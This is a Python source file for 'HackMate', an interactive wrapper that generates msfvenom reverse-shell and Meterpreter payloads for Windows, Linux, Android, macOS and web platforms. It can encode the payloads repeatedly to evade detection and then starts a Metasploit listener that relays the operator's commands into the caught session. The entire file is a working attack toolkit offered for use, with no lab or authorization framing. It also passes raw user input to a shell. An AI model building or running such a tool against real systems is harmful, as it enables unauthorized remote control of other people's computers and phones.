import pyfiglet
import os
import subprocess
import threading
from colorama import Fore, init

init(autoreset=True)

def clear_screen():
    os.system('clear')

def print_hackmate_logo():
    ascii_art = pyfiglet.figlet_format("HackMate", font="slant")
    ascii_art = Fore.BLUE + ascii_art
    ascii_art += Fore.GREEN + "-By Mr.CodeX"
    print(ascii_art)

def display_payload_options():
    print(Fore.CYAN + "\nPayload Options:")
    print("1. Windows Payloads")
    print("2. Linux Payloads")
    print("3. Android Payloads")
    print("4. MacOS Payloads")
    print("5. Web Payloads")
    print("6. Staged vs. Stage-less Payloads")
    print("0. Exit")

def get_user_input(prompt):
    return input(Fore.YELLOW + prompt)

def generate_payload(payload_type, lhost, lport, output_file, encoder=None, iterations=None, format=None):
    command = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f {format} -o {output_file}"
    
    if encoder:
        command += f" -e {encoder}"
    if iterations:
        command += f" -i {iterations}"
    
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    if process.returncode == 0:
        print(Fore.GREEN + f"\nPayload successfully generated and saved to {output_file}")
    else:
        print(Fore.RED + f"\nError generating payload: {stderr.decode()}")

def start_listener(payload_type, lhost, lport):
    print(Fore.CYAN + "\nStarting Metasploit listener...")
    listener_script = f"""
    use exploit/multi/handler
    set PAYLOAD {payload_type}
    set LHOST {lhost}
    set LPORT {lport}
    exploit -j
    """
    with open("listener.rc", "w") as f:
        f.write(listener_script)

    command = "msfconsole -q -r listener.rc"
    process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    def read_output():
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(output.strip())

    output_thread = threading.Thread(target=read_output)
    output_thread.daemon = True
    output_thread.start()

    print(Fore.YELLOW + "\nType 'exit' to stop the listener and return to the menu.")
    while True:
        user_input = input("meterpreter > ").strip()
        if user_input.lower() == 'exit':
            print(Fore.RED + "\nStopping the listener...")
            process.terminate()
            break
        else:
            process.stdin.write(user_input + "\n")
            process.stdin.flush()

def handle_windows_payloads():
    while True:
        clear_screen()
        print_hackmate_logo()
        print(Fore.CYAN + "\nWindows Payloads:")
        print("1. windows/meterpreter/reverse_tcp")
        print("2. windows/shell/reverse_tcp")
        print("3. windows/meterpreter/reverse_http")
        print("0. Back to Main Menu")
        selection = get_user_input("\nPlease select a payload (1-3, or 0 to go back): ")

        if selection == "0":
            break

        payloads = {
            "1": "windows/meterpreter/reverse_tcp",
            "2": "windows/shell/reverse_tcp",
            "3": "windows/meterpreter/reverse_http"
        }

        if selection in payloads:
            payload_type = payloads[selection]
            print(Fore.GREEN + f"\nYou selected: {payload_type}")
            lhost = get_user_input("Enter LHOST (your IP): ")
            lport = get_user_input("Enter LPORT (your port): ")
            output_file = get_user_input("Enter output file name (e.g., payload.exe): ")
            encoder = get_user_input("Enter encoder (e.g., x86/shikata_ga_nai, or leave blank for none): ")
            iterations = get_user_input("Enter number of iterations for encoding (e.g., 5, or leave blank for none): ")
            format = get_user_input("Enter output format (e.g., exe, raw, hex, or leave blank for default): ") or "exe"
            
            generate_payload(payload_type, lhost, lport, output_file, encoder, iterations, format)
            start_listener(payload_type, lhost, lport)
        else:
            print(Fore.RED + "\nInvalid selection. Please try again.")

def handle_linux_payloads():
    while True:
        clear_screen()
        print_hackmate_logo()
        print(Fore.CYAN + "\nLinux Payloads:")
        print("1. linux/x86/shell_reverse_tcp")
        print("2. linux/x86/meterpreter_reverse_tcp")
        print("0. Back to Main Menu")
        selection = get_user_input("\nPlease select a payload (1-2, or 0 to go back): ")

        if selection == "0":
            break

        payloads = {
            "1": "linux/x86/shell_reverse_tcp",
            "2": "linux/x86/meterpreter_reverse_tcp"
        }

        if selection in payloads:
            payload_type = payloads[selection]
            print(Fore.GREEN + f"\nYou selected: {payload_type}")
            lhost = get_user_input("Enter LHOST (your IP): ")
            lport = get_user_input("Enter LPORT (your port): ")
            output_file = get_user_input("Enter output file name (e.g., payload.elf): ")
            encoder = get_user_input("Enter encoder (e.g., x86/shikata_ga_nai, or leave blank for none): ")
            iterations = get_user_input("Enter number of iterations for encoding (e.g., 5, or leave blank for none): ")
            format = get_user_input("Enter output format (e.g., elf, raw, hex, or leave blank for default): ") or "elf"
            
            generate_payload(payload_type, lhost, lport, output_file, encoder, iterations, format)
            start_listener(payload_type, lhost, lport)
        else:
            print(Fore.RED + "\nInvalid selection. Please try again.")

def handle_android_payloads():
    while True:
        clear_screen()
        print_hackmate_logo()
        print(Fore.CYAN + "\nAndroid Payloads:")
        print("1. android/meterpreter/reverse_tcp")
        print("2. android/shell/reverse_tcp")
        print("0. Back to Main Menu")
        selection = get_user_input("\nPlease select a payload (1-2, or 0 to go back): ")

        if selection == "0":
            break

        payloads = {
            "1": "android/meterpreter/reverse_tcp",
            "2": "android/shell/reverse_tcp"
        }

        if selection in payloads:
            payload_type = payloads[selection]
            print(Fore.GREEN + f"\nYou selected: {payload_type}")
            lhost = get_user_input("Enter LHOST (your IP): ")
            lport = get_user_input("Enter LPORT (your port): ")
            output_file = get_user_input("Enter output file name (e.g., payload.apk): ")
            encoder = get_user_input("Enter encoder (e.g., x86/shikata_ga_nai, or leave blank for none): ")
            iterations = get_user_input("Enter number of iterations for encoding (e.g., 5, or leave blank for none): ")
            format = get_user_input("Enter output format (e.g., apk, raw, hex, or leave blank for default): ") or "apk"
            
            generate_payload(payload_type, lhost, lport, output_file, encoder, iterations, format)
            start_listener(payload_type, lhost, lport)
        else:
            print(Fore.RED + "\nInvalid selection. Please try again.")

def handle_macos_payloads():
    while True:
        clear_screen()
        print_hackmate_logo()
        print(Fore.CYAN + "\nMacOS Payloads:")
        print("1. osx/x86/shell_reverse_tcp")
        print("2. osx/x86/meterpreter_reverse_tcp")
        print("0. Back to Main Menu")
        selection = get_user_input("\nPlease select a payload (1-2, or 0 to go back): ")

        if selection == "0":
            break

        payloads = {
            "1": "osx/x86/shell_reverse_tcp",
            "2": "osx/x86/meterpreter_reverse_tcp"
        }

        if selection in payloads:
            payload_type = payloads[selection]
            print(Fore.GREEN + f"\nYou selected: {payload_type}")
            lhost = get_user_input("Enter LHOST (your IP): ")
            lport = get_user_input("Enter LPORT (your port): ")
            output_file = get_user_input("Enter output file name (e.g., payload.bin): ")
            encoder = get_user_input("Enter encoder (e.g., x86/shikata_ga_nai, or leave blank for none): ")
            iterations = get_user_input("Enter number of iterations for encoding (e.g., 5, or leave blank for none): ")
            format = get_user_input("Enter output format (e.g., macho, raw, hex, or leave blank for default): ") or "macho"
            
            generate_payload(payload_type, lhost, lport, output_file, encoder, iterations, format)
            start_listener(payload_type, lhost, lport)
        else:
            print(Fore.RED + "\nInvalid selection. Please try again.")

def handle_web_payloads():
    while True:
        clear_screen()
        print_hackmate_logo()
        print(Fore.CYAN + "\nWeb Payloads:")
        print("1. php/meterpreter/reverse_tcp")
        print("2. java/meterpreter/reverse_tcp")
        print("3. perl/meterpreter/reverse_tcp")
        print("0. Back to Main Menu")
        selection = get_user_input("\nPlease select a payload (1-3, or 0 to go back): ")

        if selection == "0":
            break

        payloads = {
            "1": "php/meterpreter/reverse_tcp",
            "2": "java/meterpreter/reverse_tcp",
            "3": "perl/meterpreter/reverse_tcp"
        }

        if selection in payloads:
            payload_type = payloads[selection]
            print(Fore.GREEN + f"\nYou selected: {payload_type}")
            lhost = get_user_input("Enter LHOST (your IP): ")
            lport = get_user_input("Enter LPORT (your port): ")
            output_file = get_user_input("Enter output file name (e.g., payload.php): ")
            encoder = get_user_input("Enter encoder (e.g., x86/shikata_ga_nai, or leave blank for none): ")
            iterations = get_user_input("Enter number of iterations for encoding (e.g., 5, or leave blank for none): ")
            format = get_user_input("Enter output format (e.g., raw, hex, or leave blank for default): ") or "raw"
            
            generate_payload(payload_type, lhost, lport, output_file, encoder, iterations, format)
            start_listener(payload_type, lhost, lport)
        else:
            print(Fore.RED + "\nInvalid selection. Please try again.")

def handle_staged_payloads():
    while True:
        clear_screen()
        print_hackmate_logo()
        print(Fore.CYAN + "\nStaged vs. Stage-less Payloads:")
        print("1. windows/meterpreter/reverse_tcp (Staged)")
        print("2. windows/meterpreter_reverse_tcp (Stage-less)")
        print("0. Back to Main Menu")
        selection = get_user_input("\nPlease select a payload (1-2, or 0 to go back): ")

        if selection == "0":
            break

        payloads = {
            "1": "windows/meterpreter/reverse_tcp",
            "2": "windows/meterpreter_reverse_tcp"
        }

        if selection in payloads:
            payload_type = payloads[selection]
            print(Fore.GREEN + f"\nYou selected: {payload_type}")
            lhost = get_user_input("Enter LHOST (your IP): ")
            lport = get_user_input("Enter LPORT (your port): ")
            output_file = get_user_input("Enter output file name (e.g., payload.exe): ")
            encoder = get_user_input("Enter encoder (e.g., x86/shikata_ga_nai, or leave blank for none): ")
            iterations = get_user_input("Enter number of iterations for encoding (e.g., 5, or leave blank for none): ")
            format = get_user_input("Enter output format (e.g., exe, raw, hex, or leave blank for default): ") or "exe"
            
            generate_payload(payload_type, lhost, lport, output_file, encoder, iterations, format)
            start_listener(payload_type, lhost, lport)
        else:
            print(Fore.RED + "\nInvalid selection. Please try again.")

def main():
    while True:
        clear_screen()
        print_hackmate_logo()
        display_payload_options()

        try:
            selection = get_user_input("\nPlease select a number between 1 and 6 (or 0 to exit): ")

            if selection == "0":
                print(Fore.RED + "\nExiting...")
                break
            elif selection == "1":
                handle_windows_payloads()
            elif selection == "2":
                handle_linux_payloads()
            elif selection == "3":
                handle_android_payloads()
            elif selection == "4":
                handle_macos_payloads()
            elif selection == "5":
                handle_web_payloads()
            elif selection == "6":
                handle_staged_payloads()
            else:
                print(Fore.RED + "\nInvalid selection. Please try again.")
        except KeyboardInterrupt:
            print(Fore.RED + "\n\nProcess interrupted. Exiting...")
            break

if __name__ == "__main__":
    main()